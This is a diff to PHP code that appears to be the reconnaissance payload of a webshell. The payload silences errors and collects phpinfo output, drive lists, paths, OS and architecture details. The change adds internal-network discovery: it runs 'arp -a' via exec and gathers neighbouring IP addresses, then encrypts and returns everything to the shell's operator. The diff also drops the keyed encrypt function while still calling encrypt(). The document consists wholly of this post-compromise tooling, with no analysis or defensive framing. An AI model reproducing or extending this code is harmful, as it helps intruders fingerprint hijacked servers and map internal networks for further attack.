@@ -1,5 +1,7 @@
+<?
 error_reporting(0);
 function main($whatever) {
+    $result = array();
     ob_start(); phpinfo(); $info = ob_get_contents(); ob_end_clean();
     $driveList ="";
     if (stristr(PHP_OS,"windows")||stristr(PHP_OS,"winnt"))
@@ -21,26 +23,49 @@ function main($whatever) {
     if (PHP_INT_SIZE == 4) {
         $arch = "32";
     }
-    $result=array("basicInfo"=>base64_encode($info),"driveList"=>base64_encode($driveList),"currentPath"=>base64_encode($currentPath),"osInfo"=>base64_encode($osInfo),"arch"=>base64_encode($arch));
+    $localIp=gethostbyname(gethostname());
+    if ($localIp!=$_SERVER['SERVER_ADDR'])
+    {
+        $localIp=$localIp." ".$_SERVER['SERVER_ADDR'];
+    }
+    $extraIps=getInnerIP();
+    foreach($extraIps as $ip)
+    {
+        if (strpos($localIp,$ip)===false)
+        {
+         $localIp=$localIp." ".$ip;
+        }
+    }
+    $basicInfoObj=array("basicInfo"=>base64_encode($info),"driveList"=>base64_encode($driveList),"currentPath"=>base64_encode($currentPath),"osInfo"=>base64_encode($osInfo),"arch"=>base64_encode($arch),"localIp"=>base64_encode($localIp));
     //echo json_encode($result);
-    session_start();
-    $key=$_SESSION['k'];
+    $result["status"] = base64_encode("success");
+    $result["msg"] = base64_encode(json_encode($basicInfoObj));
     //echo json_encode($result);
     //echo openssl_encrypt(json_encode($result), "AES128", $key);
-    echo encrypt(json_encode($result), $key);
+    echo encrypt(json_encode($result));
+}
+function getInnerIP()
+{
+$result = array();
+
+if (is_callable("exec"))
+{
+    $result = array();
+    exec('arp -a',$sa);
+    foreach($sa as $s)
+    {
+        if (strpos($s,'---')!==false)
+		{
+			$parts=explode(' ',$s);
+			$ip=$parts[1];
+			array_push($result,$ip);
+		}
+		//var_dump(explode(' ',$s));
+           // array_push($result,explode(' ',$s)[1]);
+    }
+
 }
 
-function encrypt($data,$key)
-{
-	if(!extension_loaded('openssl'))
-    	{
-    		for($i=0;$i<strlen($data);$i++) {
-    			 $data[$i] = $data[$i]^$key[$i+1&15]; 
-    			}
-			return $data;
-    	}
-    else
-    	{
-    		return openssl_encrypt($data, "AES128", $key);
-    	}
+return $result;
 }
+
